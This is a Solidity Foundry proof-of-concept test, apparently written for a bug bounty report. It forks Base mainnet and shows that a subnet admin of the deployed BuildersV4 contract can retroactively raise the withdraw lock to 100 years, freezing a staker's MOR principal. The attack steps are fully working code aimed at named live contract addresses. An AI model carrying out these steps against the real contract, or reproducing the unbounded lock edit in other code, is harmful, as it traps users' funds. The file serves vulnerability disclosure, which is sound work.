// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IBuildersV4 {
    struct Subnet {
        string name;
        address admin;
        uint128 unusedStorage1_V4Update;
        uint128 withdrawLockPeriodAfterDeposit;
        uint128 unusedStorage2_V4Update;
        uint256 minimalDeposit;
        address claimAdmin;
    }
    struct SubnetMetadata {
        string slug;
        string description;
        string website;
        string image;
    }

    function createSubnet(Subnet calldata subnet_, SubnetMetadata calldata metadata_) external;
    function editSubnet(bytes32 subnetId_, Subnet calldata newSubnet_) external;
    function getSubnetId(string memory subnetName_) external view returns (bytes32);
    function deposit(bytes32 subnetId_, uint256 amount_) external;
    function withdraw(bytes32 subnetId_, uint256 amount_) external;
    function subnets(bytes32 subnetId_)
        external
        view
        returns (string memory, address, uint128, uint128, uint128, uint256, address);
    function usersData(address user_, bytes32 subnetId_)
        external
        view
        returns (uint128, uint128, uint256, uint256);
    function subnetCreationFeeAmount() external view returns (uint256);
}

/// @title PoC: BuildersV4 subnet admin can retroactively extend the withdraw lock
///        on existing stakers without bound (editSubnet), permanently freezing
///        staker principal. Target: deployed BuildersV4 proxy on Base.
///        Program: Morpheus Bug Bounty v2.
contract PocBuildersLockTest is Test {
    address internal constant BUILDERS = 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9;
    address internal constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    uint256 internal constant FORK_BLOCK = 57479000;
    uint128 internal constant ORIGINAL_LOCK = 604800; // 7 days = protocol minimum
    uint128 internal constant EXTENDED_LOCK = 3153600000; // 100 years
    uint256 internal constant STAKE = 1000 ether;

    IBuildersV4 internal builders = IBuildersV4(BUILDERS);
    IERC20Min internal mor = IERC20Min(MOR);

    address internal attacker = makeAddr("subnetAdminAttacker");
    address internal victim = makeAddr("victimStaker");
    bytes32 internal subnetId;

    function setUp() public {
        vm.createSelectFork("https://mainnet.base.org", FORK_BLOCK);

        // Subnet creation is permissionless and currently free (fee = 0 on-chain).
        assertEq(builders.subnetCreationFeeAmount(), 0, "creation fee changed");

        IBuildersV4.Subnet memory subnet = IBuildersV4.Subnet({
            name: "poc-lock-extension-20261115",
            admin: attacker,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: ORIGINAL_LOCK,
            unusedStorage2_V4Update: 0,
            minimalDeposit: 1 ether,
            claimAdmin: attacker
        });
        IBuildersV4.SubnetMetadata memory meta = IBuildersV4.SubnetMetadata({
            slug: "poc",
            description: "poc",
            website: "",
            image: ""
        });

        vm.prank(attacker);
        builders.createSubnet(subnet, meta);
        subnetId = builders.getSubnetId(subnet.name);

        // Victim stakes 1,000 MOR under the advertised 7-day lock.
        deal(MOR, victim, STAKE);
        vm.startPrank(victim);
        mor.approve(BUILDERS, type(uint256).max);
        builders.deposit(subnetId, STAKE);
        vm.stopPrank();

        (, , uint256 deposited_, ) = _userData(victim);
        assertEq(deposited_, STAKE, "victim stake not recorded");
        assertEq(mor.balanceOf(victim), 0, "victim balance after deposit");
    }

    function _userData(address user_)
        internal
        view
        returns (uint128, uint128, uint256, uint256)
    {
        return builders.usersData(user_, subnetId);
    }

    function _subnetLock() internal view returns (uint128 lock_) {
        (, , , lock_, , , ) = builders.subnets(subnetId);
    }

    /// Control: with the original 7-day lock untouched, the victim withdraws
    /// in full after 8 days. The staking flow itself works as documented.
    function testControl_WithdrawAfterOriginalLock() public {
        vm.warp(block.timestamp + 8 days);
        vm.prank(victim);
        builders.withdraw(subnetId, STAKE);
        assertEq(mor.balanceOf(victim), STAKE, "control: victim did not recover stake");
    }

    /// Attack: after the victim has staked, the subnet admin (an unprivileged
    /// account that merely created a subnet) edits the subnet and raises the
    /// withdraw lock to 100 years. The edit applies retroactively: the victim
    /// cannot withdraw even long after the originally agreed lock expired.
    function testAttack_AdminExtendsLockRetroactively() public {
        IBuildersV4.Subnet memory edited = IBuildersV4.Subnet({
            name: "poc-lock-extension-20261115",
            admin: attacker,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: EXTENDED_LOCK,
            unusedStorage2_V4Update: 0,
            minimalDeposit: 1 ether,
            claimAdmin: attacker
        });
        vm.prank(attacker);
        builders.editSubnet(subnetId, edited);
        assertEq(_subnetLock(), EXTENDED_LOCK, "lock was not extended");

        // 8 days pass: the original 7-day lock has fully expired.
        vm.warp(block.timestamp + 8 days);
        vm.expectRevert(bytes("BU: user withdraw is locked"));
        vm.prank(victim);
        builders.withdraw(subnetId, STAKE);

        // 10 more years pass: still locked. The freeze is effectively permanent.
        vm.warp(block.timestamp + 3650 days);
        vm.expectRevert(bytes("BU: user withdraw is locked"));
        vm.prank(victim);
        builders.withdraw(subnetId, STAKE);

        // LOSS ASSERTION: the victim's 1,000 MOR principal remains trapped in
        // the BuildersV4 contract; the victim holds nothing.
        (, , uint256 deposited_, ) = _userData(victim);
        assertEq(deposited_, STAKE, "victim stake should still be recorded (trapped)");
        assertEq(mor.balanceOf(victim), 0, "victim recovered funds unexpectedly");
        assertGe(mor.balanceOf(BUILDERS), STAKE, "stake should remain in the contract");
    }
}
